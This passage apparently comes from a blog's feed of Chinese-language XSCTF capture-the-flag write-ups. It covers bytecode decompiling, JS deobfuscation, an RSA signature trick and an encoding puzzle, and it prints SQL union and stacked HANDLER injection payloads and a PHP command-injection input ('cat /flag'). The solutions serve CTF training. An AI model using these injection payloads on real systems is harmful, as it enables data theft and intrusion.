&#123;&#125;</span><br><span class="line">(version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module(</span><br><span class="line">    filename, code_objects</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompile_part</span>(<span class="params">co,father_name=<span class="literal">None</span>,outstream=sys.stdout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> father_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            name = <span class="string">&quot;%s.%s&quot;</span> % (father_name,co.co_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = co.co_name</span><br><span class="line">        outstream.write(<span class="string">&quot;\n# %s ____________________________________________\n&quot;</span> % name)</span><br><span class="line">        decompile(</span><br><span class="line">            version,</span><br><span class="line">            co,</span><br><span class="line">            outstream,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            timestamp,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            code_objects=&#123;&#125;,</span><br><span class="line">            source_size=source_size,</span><br><span class="line">            is_pypy=<span class="literal">False</span>,</span><br><span class="line">            magic_int=magic_int,</span><br><span class="line">            mapstream=<span class="literal">None</span>,</span><br><span class="line">            do_fragments=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bytecode = get_sub_codeObject_list(co)</span><br><span class="line">        <span class="keyword">for</span> code <span class="keyword">in</span> bytecode:</span><br><span class="line">            co = code.argval</span><br><span class="line">            decompile_part(co,name,outstream)</span><br><span class="line">decompile_part(co)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="comment">#改变标准输出的默认编码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        byteCode = fp.read()[<span class="number">16</span>:]</span><br><span class="line">   </span><br><span class="line">    co  = marshal.loads(byteCode)</span><br><span class="line">    dis.dis(co)</span><br></pre></td></tr></table></figure><p>先运行第一份代码，再运行第二份代码，就可以得到opcode的输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> 28          72 BUILD_LIST               0</span><br><span class="line">             74 LOAD_CONST               6 ((<span class="string">&#x27;Summer in the hills&#x27;</span>, <span class="string">&#x27;Those hazy days I do remember&#x27;</span>, <span class="string">&#x27;We were running still&#x27;</span>, <span class="string">&#x27;Had the whole world at our feet&#x27;</span>, <span class="string">&#x27;Watching seasons change&#x27;</span>, <span class="string">&#x27;Our roads were lined with adventure&#x27;</span>, <span class="string">&#x27;Mountains in the way&#x27;</span>, <span class="string">&quot;Couldn&#x27;t keep us from the sea&quot;</span>, <span class="string">&#x27;Here we stand open arms&#x27;</span>, <span class="string">&#x27;This is home where we are&#x27;</span>, <span class="string">&#x27;Ever strong in the world that we made&#x27;</span>, <span class="string">&#x27;I still hear you in the breeze&#x27;</span>, <span class="string">&#x27;See your shadows in the trees&#x27;</span>, <span class="string">&#x27;Holding on, memories never change&#x27;</span>))</span><br><span class="line">             76 CALL_FINALLY             1 (to 79)</span><br><span class="line">             78 STORE_DEREF              2 (phrases)</span><br><span class="line"></span><br><span class="line"> 29          80 LOAD_CONST               7 (<span class="string">&#x27;𝙓𝙎𝘾𝙏𝙁&#123;𝙁0𝙧_0𝙣𝙘3_𝙮0𝙪_𝙝4𝙫3_7𝙖57𝙚𝙙_𝙛𝙡𝙞𝙜                    𝙝𝙩_𝙮0𝙪_𝙬1𝙡𝙡_�</span></span><br><span class="line"><span class="string">44𝙡𝙠_7𝙝3_3𝙖𝙧7𝙝_𝙬17𝙝_𝙮0𝙪𝙧_3𝙮35_7𝙪𝙧𝙣3𝙙_5𝙠𝙮𝙬4𝙧𝙙5&#125;&#x27;</span>)</span><br><span class="line">             82 STORE_DEREF              3 (secret_message)</span><br><span class="line"></span><br><span class="line"> 46          84 LOAD_DEREF               4 (stdscr)</span><br><span class="line">        &gt;&gt;   86 LOAD_METHOD              7 (nodelay)</span><br><span class="line">             88 LOAD_CONST               8 (True)</span><br><span class="line">             90 CALL_METHOD              1</span><br><span class="line">             92 POP_TOP</span><br></pre></td></tr></table></figure><p>其中因为命令行的编码原因这里的flag其实是乱码（因此我还分析了一下opcode有没有加密的过程，事实证明没有）<br>但是opcode转换为py代码的方式没有找到</p><p>在复制到其他文本编辑器之后就可以看到flag了（要手打，因为格式写了只支持ascii编码的字符，这里是unicode）</p><p><code>XSCTF&#123;F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5&#125;</code><br><del>这flag真长啊</del></p><h2 id="Running"><a href="#Running" class="headerlink" title="Running~"></a>Running~</h2><p>一个没有后缀的文件，内容是js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x21b6c9=_0xe50d;<span class="function"><span class="keyword">function</span> <span class="title">_0xe50d</span>(<span class="params">_0x483c4e,_0x3bb3e1</span>)</span>&#123;<span class="keyword">var</span> _0x1173b4=_0x1173();<span class="keyword">return</span> _0xe50d=<span class="function"><span class="keyword">function</span>(<span class="params">_0xe50d90,_0x1a4c11</span>)</span>&#123;_0xe50d90=_0xe50d90-<span class="number">0x105</span>;<span class="keyword">var</span> _0x33ff31=_0x1173b4[_0xe50d90];<span class="keyword">return</span> _0x33ff31;&#125;,_0xe50d(_0x483c4e,_0x3bb3e1);&#125;<span class="function"><span class="keyword">function</span> <span class="title">_0x1173</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x2badaa=[<span class="string">&#x27;920aGutvi&#x27;</span>,<span class="string">&#x27;517wlRFdu&#x27;</span>,<span class="string">&#x27;221112hjXCvb&#x27;</span>,<span class="string">&#x27;169436bqkkfr&#x27;</span>,<span class="string">&#x27;8dhAXCJ&#x27;</span>,<span class="string">&#x27;12838203EfwKcG&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;CgogX18gICBfXyAgIF9fX19fICAgIF9fX19fICAgX19fX19fXyAgIF9fX19fXyAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXyAgIF8gICAgIF8gICAgICAgICAgIF8gICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgIF8gIF8gICAgIF8gICAgIF8gICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgX19fXyAgICBfICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgXyAgICAgICAgICAgICAgICAgIF9fICAgCiBcIFwgLyAvICAvIF9fX198ICAvIF9fX198IHxfXyAgIF9ffCB8ICBfX19ffCAgIC8gLyAgICAgL1wgICAgICAgICAgICAgICAgICAgICAgfF8gICBffCAgICAgICAgIChfKSB8IHwgICAoXykgICAgICAgICB8IHwgICAgICAgICAgfCAgX19fX3wgICAgICAgICAgICAgICAgL18gfCAgICAgICAgICAgICAgICB8IHx8IHwgICB8IHwgICAoXykgIC8gXyBcICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gX3wgICAgICAgICAgIC8gX18gXCAgfCB8ICAgICAgLyBffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgfCAgIChfKSAgICAgICAgICAgICAgICAgXCBcICAKICBcIFYgLyAgfCAoX19fICAgfCB8ICAgICAgICAgfCB8ICAgIHwgfF9fICAgICB8IHwgICAgIC8gIFwgICAgIF8gX18gICAgICAgICAgICAgIHwgfCAgICBfIF9fICAgIF8gIHwgfF8gICBfICAgIF9fIF8gIHwgfCAgICAgICAgICB8IHxfXyAgICBfXyAgX18gIF8gX18gICAgfCB8ICAgX19fICAgIF8gX18gIHwgfHwgfF8gIHwgfF8gICBfICB8IHwgfCB8ICBfIF9fICAgICAgICAgICAgICBfX18gICB8IHxfICAgICAgICAgICB8IHwgIHwgfCB8IHxfXyAgIHwgfF8gICBfICAgXyAgIF9fXyAgICBfX18gICAgX18gXyAgfCB8XyAgIF8gICAgX19fICAgIF8gX18gICAgfCB8IAogICA+IDwgICAgXF9fXyBcICB8IHwgICAgICAgICB8IHwgICAgfCAgX198ICAgLyAvICAgICAvIC9cIFwgICB8ICdfIFwgICAgICAgICAgICAgfCB8ICAgfCAnXyBcICB8IHwgfCBfX3wgfCB8ICAvIF9gIHwgfCB8ICAgICAgICAgIHwgIF9ffCAgIFwgXC8gLyB8ICdfIFwgICB8IHwgIC8gXyBcICB8ICdfX3wgfF9fICAgX3wgfCBfX3wgfCB8IHwgfCB8IHwgfCAnXyBcICAgICAgICAgICAgLyBfIFwgIHwgIF98ICAgICAgICAgIHwgfCAgfCB8IHwgJ18gXCAgfCAgX3wgfCB8IHwgfCAvIF9ffCAgLyBfX3wgIC8gX2AgfCB8IF9ffCB8IHwgIC8gXyBcICB8ICdfIFwgICAgXCBcCiAgLyAuIFwgICBfX19fKSB8IHwgfF9fX18gICAgIHwgfCAgICB8IHwgICAgICBcIFwgICAgLyBfX19fIFwgIHwgfCB8IHwgICAgICAgICAgIF98IHxfICB8IHwgfCB8IHwgfCB8IHxfICB8IHwgfCAoX3wgfCB8IHwgICAgICAgICAgfCB8X19fXyAgID4gIDwgIHwgfF8pIHwgIHwgfCB8IChfKSB8IHwgfCAgICAgICB8IHwgICB8IHxfICB8IHwgfCB8X3wgfCB8IHwgfCB8ICAgICAgICAgIHwgKF8pIHwgfCB8ICAgICAgICAgICAgfCB8X198IHwgfCB8XykgfCB8IHwgICB8IHxffCB8IFxfXyBcIHwgKF9fICB8IChffCB8IHwgfF8gIHwgfCB8IChfKSB8IHwgfCB8IHwgICAvIC8KIC9fLyBcX1wgfF9fX19fLyAgIFxfX19fX3wgICAgfF98ICAgIHxffCAgICAgICB8IHwgIC9fLyAgICBcX1wgfF98IHxffCAgICAgICAgICB8X19fX198IHxffCB8X3wgfF98ICBcX198IHxffCAgXF9fLF98IHxffCAgICAgICAgICB8X19fX19ffCAvXy9cX1wgfCAuX18vICAgfF98ICBcX19fLyAgfF98ICAgICAgIHxffCAgICBcX198IHxffCAgXF9fXy8gIHxffCB8X3wgICAgICAgICAgIFxfX18vICB8X3wgICAgICAgICAgICAgXF9fX18vICB8Xy5fXy8gIHxffCAgICBcX18sX3wgfF9fXy8gIFxfX198ICBcX18sX3wgIFxfX3wgfF98ICBcX19fLyAgfF98IHxffCAgfCB8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX1wgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICB8IHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCg==&#x27;</span>,<span class="string">&#x27;3076824IERKkW&#x27;</span>,<span class="string">&#x27;6626otVnDv&#x27;</span>,<span class="string">&#x27;4488330eyQBas&#x27;</span>,<span class="string">&#x27;7196435AHLNnm&#x27;</span>];_0x1173=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> _0x2badaa;&#125;;<span class="keyword">return</span> _0x1173();&#125;(<span class="function"><span class="keyword">function</span>(<span class="params">_0x3fa77a,_0x506be4</span>)</span>&#123;<span class="keyword">var</span> _0x324ad3=_0xe50d,_0x1b9807=_0x3fa77a();<span class="function"><span class="title">while</span>(<span class="params">!![]</span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x5cf5b7=-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x107</span>))/<span class="number">0x1</span>*(-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10f</span>))/<span class="number">0x2</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10e</span>))/<span class="number">0x3</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x109</span>))/<span class="number">0x4</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x105</span>))/<span class="number">0x5</span>+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x110</span>))/<span class="number">0x6</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10b</span>))/<span class="number">0x7</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10a</span>))/<span class="number">0x8</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x108</span>))/<span class="number">0x9</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x106</span>))/<span class="number">0xa</span>);<span class="keyword">if</span>(_0x5cf5b7===_0x506be4)<span class="keyword">break</span>;<span class="keyword">else</span> _0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x29c073</span>)</span>&#123;_0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x1173,<span class="number">0xf2d11</span>),<span class="built_in">console</span>[_0x21b6c9(<span class="number">0x10c</span>)](atob(_0x21b6c9(<span class="number">0x10d</span>))));</span><br></pre></td></tr></table></figure><p>直接复制到浏览器控制台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__   __   _____    _____   _______   ______     __                              _____           _   _     _           _            ______                  __                  _  _     _     _    ___                              __             ____    _        __                                _     _                  __   </span><br><span class="line">\ \ &#x2F; &#x2F;  &#x2F; ____|  &#x2F; ____| |__   __| |  ____|   &#x2F; &#x2F;     &#x2F;\                      |_   _|         (_) | |   (_)         | |          |  ____|                &#x2F;_ |                | || |   | |   (_)  &#x2F; _ \                            &#x2F; _|           &#x2F; __ \  | |      &#x2F; _|                              | |   (_)                 \ \  </span><br><span class="line"> \ V &#x2F;  | (___   | |         | |    | |__     | |     &#x2F;  \     _ __              | |    _ __    _  | |_   _    __ _  | |          | |__    __  __  _ __    | |   ___    _ __  | || |_  | |_   _  | | | |  _ __              ___   | |_           | |  | | | |__   | |_   _   _   ___    ___    __ _  | |_   _    ___    _ __    | | </span><br><span class="line">  &gt; &lt;    \___ \  | |         | |    |  __|   &#x2F; &#x2F;     &#x2F; &#x2F;\ \   | &#39;_ \             | |   | &#39;_ \  | | | __| | |  &#x2F; _&#96; | | |          |  __|   \ \&#x2F; &#x2F; | &#39;_ \   | |  &#x2F; _ \  | &#39;__| |__   _| | __| | | | | | | | &#39;_ \            &#x2F; _ \  |  _|          | |  | | | &#39;_ \  |  _| | | | | &#x2F; __|  &#x2F; __|  &#x2F; _&#96; | | __| | |  &#x2F; _ \  | &#39;_ \    \ \</span><br><span class="line"> &#x2F; . \   ____) | | |____     | |    | |      \ \    &#x2F; ____ \  | | | |           _| |_  | | | | | | | |_  | | | (_| | | |          | |____   &gt;  &lt;  | |_) |  | | | (_) | | |       | |   | |_  | | | |_| | | | | |          | (_) | | |            | |__| | | |_) | | |   | |_| | \__ \ | (__  | (_| | | |_  | | | (_) | | | | |   &#x2F; &#x2F;</span><br><span class="line">&#x2F;_&#x2F; \_\ |_____&#x2F;   \_____|    |_|    |_|       | |  &#x2F;_&#x2F;    \_\ |_| |_|          |_____| |_| |_| |_|  \__| |_|  \__,_| |_|          |______| &#x2F;_&#x2F;\_\ | .__&#x2F;   |_|  \___&#x2F;  |_|       |_|    \__| |_|  \___&#x2F;  |_| |_|           \___&#x2F;  |_|             \____&#x2F;  |_.__&#x2F;  |_|    \__,_| |___&#x2F;  \___|  \__,_|  \__| |_|  \___&#x2F;  |_| |_|  | | </span><br><span class="line">                                               \_\                     ______                                             ______                  | |                                                             ______                 ______                                                                                &#x2F;_&#x2F;  </span><br><span class="line">                                                                      |______|                                           |______|                 |_|                                                            |______|               |______|                                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拉伸一下就可以看到flag（换成不会自动换行的文本编辑软件，如notepad++）</p><p><code>XSCTF&#123;An_Initial_Exp1or4ti0n_of_Obfuscation&#125;</code></p><h2 id="saveSaofe1a-partA"><a href="#saveSaofe1a-partA" class="headerlink" title="saveSaofe1a_partA"></a>saveSaofe1a_partA</h2><p>考sql注入<br>测试一下发现是字符型查询，并且存在联合注入</p><ul><li>首先查询当前数据库</li><li>然后查询该数据库下的表</li><li>然后查询表下的字段</li><li>根据题目提示，逐个翻表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;</span>student<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;class1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class1#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>),<span class="keyword">group_concat</span>(<span class="keyword">name</span>),<span class="keyword">group_concat</span>(<span class="keyword">class</span>),<span class="keyword">group_concat</span>(hobbies) <span class="keyword">from</span> class2<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class3#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_r3a11y_l0ve_xiaomei&#125;</code></p><h2 id="saveSaofe1a-partB"><a href="#saveSaofe1a-partB" class="headerlink" title="saveSaofe1a_partB"></a>saveSaofe1a_partB</h2><p>同样是sql注入<br>经过测试：<br><code>让我想想除了insert、where、delete、select、drop、update和.你们大黑阔还有什么招</code><br><code>嘻嘻，想起来了，set、prepare、execute也不行哦</code></p><p>用handler可以查</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">read</span> <span class="keyword">first</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>如果不在第一条，但是题目又过滤了where关键字，可以使用limit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">read</span> <span class="keyword">first</span> <span class="keyword">limit</span> <span class="number">30</span>,<span class="number">1</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_wAnt_a_9ir1fri3nd&#125;</code></p><h2 id="燕子不要走"><a href="#燕子不要走" class="headerlink" title="燕子不要走~"></a>燕子不要走~</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//燕子，燕子，没有你我怎么活啊，不要甩开我啊  </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params">$cmd</span>)</span>&#123;    system($cmd.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) ? hello_shell($_GET[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用分号隔开即可<br><code>?cmd=cat /flag;</code></p><p><code>XSCTF&#123;Yanz1_i_w1sh_y0u_hApp1neSs&#125;</code></p><h2 id="gift-RSA"><a href="#gift-RSA" class="headerlink" title="gift_RSA"></a>gift_RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">gift = <span class="built_in">pow</span>(m, d, n)</span><br><span class="line">print(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">print(<span class="string">f&#x27;gift = <span class="subst">&#123;gift&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"><span class="string">gift = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据公钥加密算法的特性，公私钥互换效果是一样的，这里用私钥加密（签名），就可以使用公钥解密（验证）</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line">n = <span class="number">130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, e, n)))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;H3re_i5_@_Gif7_f0r_y0u_From_Euler:)))))!&#125;</code></p><h2 id="你说你是凯撒大帝尊嘟假嘟啊"><a href="#你说你是凯撒大帝尊嘟假嘟啊" class="headerlink" title="你说你是凯撒大帝尊嘟假嘟啊"></a>你说你是凯撒大帝尊嘟假嘟啊</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Öv0 0vo O.0 O_Ö Övo 0vo ov0 ovÖ o.Ö owÖ 0.o OwÖ o.O Ö.O O_0 o_Ö Ö_0 OwÖ Ov0 0wÖ Ö.Ö owO 0v0 o.O o.Ö Ö.0 o.0 ovO o.Ö Ö.o 0vo Ow0 Ö.Ö owo 0_0 0.0 o.Ö Ö.O O.0 O_0 o_O 0vÖ owo </span><br></pre></td></tr></table></figure><p><a href="https://zdjd.vercel.app/">尊嘟假嘟O.o (zdjd.vercel.app)</a></p><p>解密之后凯撒爆破</p><p><code>XSCTF&#123;gr3at_y0u_aRe_reA1_CaesAr&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_warmup</title>
      <link href="2024/11/04/xsctf_warmup/"/>
      <url>2024/11/04/xsctf_warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>附件：babystack</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  init_func(argc, argv, envp);</span><br><span class="line">  start_show();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  __isoc99_scanf(v4);</span><br><span class="line">  vuln(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 